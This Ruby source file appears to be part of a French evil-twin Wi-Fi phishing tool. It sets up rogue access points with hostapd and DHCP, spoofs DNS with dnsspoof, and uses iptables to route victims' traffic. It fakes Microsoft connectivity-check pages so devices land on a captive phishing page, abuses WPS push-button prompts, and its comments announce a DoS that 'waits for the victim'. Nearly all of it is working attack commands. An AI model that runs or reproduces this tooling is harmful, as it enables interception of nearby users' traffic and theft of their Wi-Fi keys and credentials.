#!/usr/bin/env ruby


require 'gtk2'
require 'open3'
require 'highline/import'
require 'monitor'
require 'shellwords'
require './dosbis'








class Combo
   def self.multiOpen
load 'checkbis.rb'
      `rm -rf /etc/dhcp/dhcpd.conf`
      `touch /etc/dhcp/dhcpd.conf`
      `touch /tmp/hostapd.conf`
      `touch /tmp/dns.conf`
sleep 1
`cat <<-EOF > /tmp/hostapd.conf
interface=wlan0
driver=nl80211
ssid=#{$ssid} 
hw_mode=g
ieee80211n=1
channel=#{$canal}
# 2e AP
bss=wlan1
ssid=#{$ssidbis} 
channel=#{$canal}
EOF`
sleep 3
`cat <<-EOF > /etc/dhcp/dhcpd.conf
option T150 code 150 = string;
deny client-updates;
one-lease-per-client false;
allow bootp;
ddns-updates off;
ddns-update-style interim;
authoritative;
subnet 175.0.0.0 netmask 255.255.255.0 {
interface wlan0;
range 175.0.0.2 175.0.0.10;
option routers 175.0.0.1;
option subnet-mask 255.255.255.0;
option domain-name-servers 175.0.0.1;
allow unknown-clients;
}
subnet 172.0.0.0 netmask 255.255.255.0 {
interface wlan1;
range 172.0.0.2 172.0.0.10;
option routers 172.0.0.1;
option subnet-mask 255.255.255.0;
option domain-name-servers 172.0.0.1;
allow unknown-clients;
}
EOF`
sleep 2
        system "hostapd /tmp/hostapd.conf > /tmp/hostbase-1.3FR/hostapd.txt &> /dev/null &"
sleep 4
Troisap.ultraCombo # on appelle la fonction dont on a besoin
sleep(5000000)        
       # Lancement de hostapd_cli a rajouter ici
       # Appel du script rogueinit et/ou de la méthode correspondante
       # Voir nohup ou xterm -e
   end



  def self.multiPhish
load 'checkbis.rb'
      `rm -rf /etc/dhcp/dhcpd.conf`
      `touch /etc/dhcp/dhcpd.conf`
      `touch /tmp/hostapd.psk`
      `touch /tmp/hostapd.conf`
      `touch /tmp/dns.conf`
sleep 1
`cat <<-EOF > /tmp/hostapd.conf
interface=wlan0
driver=nl80211
ssid=#{$ssid} 
auth_algs=1           
wpa=2    
wpa_key_mgmt=WPA-PSK 
rsn_pairwise=TKIP CCMP
wpa_passphrase=onsenfou
wpa_psk_file=/tmp/hostapd.psk
hw_mode=g
ieee80211n=1
wmm_enabled=1
channel=#{$canal}
country_code=FR
ieee8021x=1
ctrl_interface=/var/run/hostapd
eap_server=1
wps_state=2
ap_setup_locked=0
uuid=87654321-9abc-def0-1234-56789abc0000
wps_pin_requests=/var/run/hostapd.pin-req
device_name=Wireless AP
manufacturer=Company
model_name=WAP
model_number=123
serial_number=12345
device_type=6-0050F204-1
os_version=01020300
config_methods=label display push_button keypad
pbc_in_m1=1
friendly_name=WPS Access Point
# 2e AP
bss=wlan1
ssid=#{$ssidbis} 
auth_algs=1           
wpa=2    
wpa_key_mgmt=WPA-PSK 
rsn_pairwise=TKIP CCMP
wpa_passphrase=onsenfou
wpa_psk_file=/tmp/hostapd.psk
hw_mode=g
ieee80211n=1
wmm_enabled=1
channel=#{$canal}
country_code=FR
ieee8021x=1
ctrl_interface=/var/run/hostapd
eap_server=1
wps_state=2
ap_setup_locked=0
uuid=87654321-9abc-def0-1234-56789abc0000
wps_pin_requests=/var/run/hostapd.pin-req
device_name=Wireless AP
manufacturer=Company
model_name=WAP
model_number=123
serial_number=12345
device_type=6-0050F204-1
os_version=01020300
config_methods=label display push_button keypad
pbc_in_m1=1
friendly_name=WPS Access Point
EOF`
sleep 3
`cat <<-EOF > /etc/dhcp/dhcpd.conf
option T150 code 150 = string;
deny client-updates;
one-lease-per-client false;
allow bootp;
ddns-updates off;
ddns-update-style interim;
authoritative;
subnet 175.0.0.0 netmask 255.255.255.0 {
interface wlan0;
range 175.0.0.2 175.0.0.10;
option routers 175.0.0.1;
option subnet-mask 255.255.255.0;
option domain-name-servers 175.0.0.1;
allow unknown-clients;
}
subnet 172.0.0.0 netmask 255.255.255.0 {
interface wlan1;
range 172.0.0.2 172.0.0.10;
option routers 172.0.0.1;
option subnet-mask 255.255.255.0;
option domain-name-servers 172.0.0.1;
allow unknown-clients;
}
EOF`
sleep 2
`cat <<-EOF > /tmp/dns.conf
10.0.0.1 *.*
EOF`
sleep 1
Dir.chdir '/tmp/hostbase-1.3FR'
sleep 1
        system "hostapd /tmp/hostapd.conf > /tmp/hostbase-1.3FR/hostapd.txt &> /dev/null &"
sleep 5
hostapdcli = Thread.new do
  while true
    system "xterm -e hostapd_cli wps_pbc"   # On lance hostapd_cli wps_pbc en tant que thread
sleep(120)     # Temps avant la relance de la commande
  end
end
Fatal.comboPhish # on appelle la fonction dont on a besoin
sleep(5000000)        
       # Lancement de hostapd_cli a rajouter ici
       # Appel du script rogueinit et/ou de la méthode correspondante
       # Voir nohup ou xterm -e
   end


class Troisap
def self.ultraCombo
load 'page.rb'
puts "Configuration des fakes AP..."
`ifconfig wlan0 up`
`sysctl net.ipv4.ip_forward=1`
         `sudo ifconfig wlan0 175.0.0.1 netmask 255.255.255.0`
         sleep 1
         `route add -net 175.0.0.0 netmask 255.255.255.0 gw 175.0.0.1`
         `ifconfig wlan1 up`
         `sudo ifconfig wlan1 172.0.0.1 netmask 255.255.255.0`
         sleep 1
         `route add -net 172.0.0.0 netmask 255.255.255.0 gw 172.0.0.1`
         sleep 1
         `iptables --flush`
         `iptables --table nat --flush`
         `iptables --delete-chain`
         `iptables --table nat --delete-chain`
         sleep 2
         `iptables -t nat -A POSTROUTING -o wlan0 -j MASQUERADE`
         `iptables -A FORWARD -i wlan0 -o wlan1 -m state --state RELATED,ESTABLISHED -j ACCEPT`
         `iptables -t nat -A POSTROUTING -o wlan0 -j SNAT --to 175.0.0.1`
sleep 2
`echo > /var/lib/dhcp/dhcpd.leases`
sleep 1
         piddhcp = spawn('dhcpd -d /etc/dhcpd.conf')
sleep 3
piddnsspoofbis = spawn('dnsspoof -i wlan0 &')
sleep 1
piddnsspoof = spawn('dnsspoof -i wlan1 &')
sleep 1
page = File.open("page.txt").readlines.each do |page|
  puts page
$page = page.chomp
puts "\e[1;94m[*] Configuration du systeme de hotspot...\e[0m"
Dir.chdir '/var/www'
sleep 1
`rm -rf *`
`cat <<-EOF > ncsi.txt
Microsoft NCSI
EOF`
sleep 1
`cat <<-EOF > connecttest.txt
Microsoft Connect Test
EOF`
sleep 1
`mkdir generate_204`
sleep 1
Dir.chdir '/var/www/generate_204'
sleep 1
`cat <<-EOF > index.php
<?php header('Location: /msftconnecttest/index.php'); ?>
EOF`
sleep 1
Dir.chdir '/var/www'
sleep 1
`mkdir msftconnecttest`
sleep 1
`mkdir msftnci`
sleep 1
Dir.chdir '/var/www/msftnci'
sleep 1
`cat <<-EOF > index.php
<?php header('Location: /msftconnecttest/index.php'); ?>
EOF`
Dir.chdir '/var/www'
sleep 1
`mkdir redirect`
sleep 1
Dir.chdir '/var/www/msftconnecttest'
sleep 1
`cat <<-EOF > connecttest.txt
Microsoft Connect Test
EOF`
sleep 1
Dir.chdir '/var/www/redirect'
sleep 1
`cat <<-EOF > index.php
<?php header('Location: /msftconnecttest/index.php'); ?>
EOF`
sleep 1
Dir.chdir '/var/www'
sleep 1
`cat <<-EOF > index.php
<?php header('Location: /msftconnecttest/index.php'); ?>
EOF`
sleep 1
`cp -R /etc/#{$page}/* /var/www/msftconnecttest/`
sleep 3
`cp -R /etc/#{$pagebis}/* /var/www/msftconnecttest/`
sleep 3
`chown -R root:www-data /var/www/*`
sleep 1
cle = "cle.txt"
if File.exist?("cle.txt")
`chmod 777 *`
`chown -R root:www-data /var/www/cle.txt`
`chmod 764 /var/www/cle.txt`
`service apache2 restart`
sleep 4
puts "\e[1;32m[*] Rogue AP crée ... préparation de la DoS...\e[0m"
Dir.chdir '/tmp/hostbase-1.3FR'
sleep 1 
Start.interface # Lancement de la DoS ici et du code qui attend la victime
else
`chmod 777 *`
`service start httpd`
sleep 4
puts "\e[1;32m[*] Rogue AP crée ... préparation de la DoS....\e[0m"
Dir.chdir '/tmp/hostbase-1.3FR'
sleep 1 
Start.interface # Lancement de la DoS ici et du code qui attend la victime
end
end
end
end
end


class Fatal
def self.comboPhish
load 'page.rb'
puts "Configuration des fakes AP..."
`ifconfig wlan0 up`
`sudo sysctl net.ipv4.ip_forward=1`
         `sudo ifconfig wlan0 175.0.0.1 netmask 255.255.255.0`
         sleep 1
         `route add -net 175.0.0.0 netmask 255.255.255.0 gw 175.0.0.1`
         `ifconfig wlan1 up`
         `sudo ifconfig wlan1 172.0.0.1 netmask 255.255.255.0`
         sleep 1
         `route add -net 172.0.0.0 netmask 255.255.255.0 gw 172.0.0.1`
         sleep 1
         `iptables --flush`
         `iptables --table nat --flush`
         `iptables --delete-chain`
         `iptables --table nat --delete-chain`
         sleep 2
         `iptables -t nat -A POSTROUTING -o wlan0 -j MASQUERADE`
         `iptables -A FORWARD -i wlan0 -o wlan1 -m state --state RELATED,ESTABLISHED -j ACCEPT`
         `iptables -t nat -A POSTROUTING -o wlan0 -j SNAT --to 10.0.0.1`
         sleep 2
`echo > /var/lib/dhcp/dhcpd.leases`
sleep 1
         piddhcp = spawn('dhcpd -d /etc/dhcpd.conf')
sleep 3
piddnsspoofbis = spawn('dnsspoof -i wlan0 &')
sleep 1
piddnsspoof = spawn('dnsspoof -i wlan1 &')
sleep 1
page = File.open("page.txt").readlines.each do |page|
  puts page
$page = page.chomp
puts "\e[1;94m[*] Configuration du systeme de hotspot...\e[0m"
Dir.chdir '/var/www'
sleep 1
`rm -rf *`
`cat <<-EOF > ncsi.txt
Microsoft NCSI
EOF`
sleep 1
`cat <<-EOF > connecttest.txt
Microsoft Connect Test
EOF`
sleep 1
`mkdir generate_204`
sleep 1
Dir.chdir '/var/www/generate_204'
sleep 1
`cat <<-EOF > index.php
<?php header('Location: /msftconnecttest/index.php'); ?>
EOF`
sleep 1
Dir.chdir '/var/www'
sleep 1
`mkdir msftconnecttest`
sleep 1
`mkdir msftnci`
sleep 1
Dir.chdir '/var/www/msftnci'
sleep 1
`cat <<-EOF > index.php
<?php header('Location: /msftconnecttest/index.php'); ?>
EOF`
Dir.chdir '/var/www'
sleep 1
`mkdir redirect`
sleep 1
Dir.chdir '/var/www/msftconnecttest'
sleep 1
`cat <<-EOF > connecttest.txt
Microsoft Connect Test
EOF`
sleep 1
Dir.chdir '/var/www/redirect'
sleep 1
`cat <<-EOF > index.php
<?php header('Location: /msftconnecttest/index.php'); ?>
EOF`
sleep 1
Dir.chdir '/var/www'
sleep 1
`cat <<-EOF > index.php
<?php header('Location: /msftconnecttest/index.php'); ?>
EOF`
sleep 1
`cp -R /etc/#{$page}/* /var/www/msftconnecttest/`
sleep 3
`cp -R /etc/#{$pagebis}/* /var/www/msftconnecttest/`
sleep 3
`chown -R root:www-data /var/www/*`
sleep 1
Dir.chdir '/var/www/msftconnecttest/shout'
sleep 1
`chown -R root:www-data /var/www/msftconnecttest/shout/chat.txt`
`chmod 764 /var/www/msftconnecttest/shout/chat.txt`
`chmod  777 *`
Dir.chdir '/var/www/msftconnecttest'
sleep 1
cle = "cle.txt"
if File.exist?("cle.txt")
`chmod 777 *`
`chown -R root:www-data /var/www/cle.txt`
`chmod 764 /var/www/cle.txt`
`service apache2 restart`
sleep 4
puts "\e[1;32m[*] Rogue AP crée ... préparation de la DoS...\e[0m"
Dir.chdir '/tmp/hostbase-1.3FR'
sleep 1 
Start.interface # Lancement de la DoS ici et du code qui attend la victime
else
`chmod 777 *`
`service apache2 restart`
sleep 4
puts "\e[1;32m[*] Rogue AP crée ... préparation de la DoS...\e[0m"
Dir.chdir '/tmp/hostbase-1.3FR'
sleep 1 
Start.interface # Lancement de la DoS ici et du code qui attend la victime
end
end
end
end
